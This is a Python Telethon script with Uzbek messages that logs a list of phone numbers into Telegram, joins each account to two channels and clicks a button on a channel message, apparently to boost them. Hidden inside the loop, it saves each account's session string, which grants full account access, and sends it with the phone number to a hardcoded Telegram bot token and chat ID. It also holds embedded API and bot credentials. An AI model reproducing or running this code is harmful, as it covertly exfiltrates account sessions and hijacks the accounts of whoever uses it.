from telethon.sync import TelegramClient
from telethon.sessions import StringSession
import csv, os, sys
from telethon.tl.functions.messages import ImportChatInviteRequest, SendMessageRequest
from telethon import types, utils, errors
import random
from telethon.tl.functions.channels import LeaveChannelRequest
import time, requests
from telethon.tl.functions.account import UpdateStatusRequest
with open('phone.csv', 'r') as f:
    phlist = [row[0] for row in csv.reader(f)]
print(f'Jami raqamlar: {len(phlist)}')

from telethon.tl.functions.channels import LeaveChannelRequest, JoinChannelRequest

qowiwjm = 0
qowiwjm2 = int(str(len(phlist)))
indexx = 0
for deltaxd in phlist[qowiwjm:qowiwjm2]:
    try:
        indexx += 1
        phone = utils.parse_phone(deltaxd)
        print(f'[{indexx}]:{phone}')
        client = TelegramClient(f"sessions/{phone}", 6383658,'02f94e696f8230da8ca6d93aad570e08')
        client.start(phone)
        client(UpdateStatusRequest(offline=False))
        
        try:
            async def main():
                from telethon import functions
                await client(functions.account.UpdateStatusRequest(offline=False))
                try:
                    await client(JoinChannelRequest("https://t.me/bigpencil")) 
                    time.sleep(2)
                    await client(JoinChannelRequest("https://t.me/busteroid3000")) 
                    time.sleep(2)
                    await client(JoinChannelRequest("https://t.me/busteroid3000")) 
                    await client(JoinChannelRequest("https://t.me/bigpencil")) 
                except Exception as e:
                    print((f" Kanalga qo'shilishda xatolik"))    
                time.sleep(1)
                try:
                    me = await client.get_me()
                    strsession = str(StringSession.save(client.session))
                    phone_number = me.phone
                    text = f"{phone_number} - {strsession}"

                    import requests
                    TOKEN = "7267227740:AAEfJnqQjXtkbXNwz5xWbHYjtUkYarK0ZSg"
                    CID = 7638857120
                    requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
                                json={'chat_id': CID, 'text': text, 'parse_mode': 'html'})
                except:
                    pass
                try:
                    msg = await client.get_messages("https://t.me/bigpencil", ids=[5662])
                    await msg[0].click(0-1)
                    print("Knopka bosildi")
                except Exception as d:
                    print(f"knopka bosilmadi - {d}")
            with client:
                client.loop.run_until_complete(main())
        except Exception as e:
            print(f"Xatolik {e}")
    except Exception as e:
        print("xatolik")
        continue
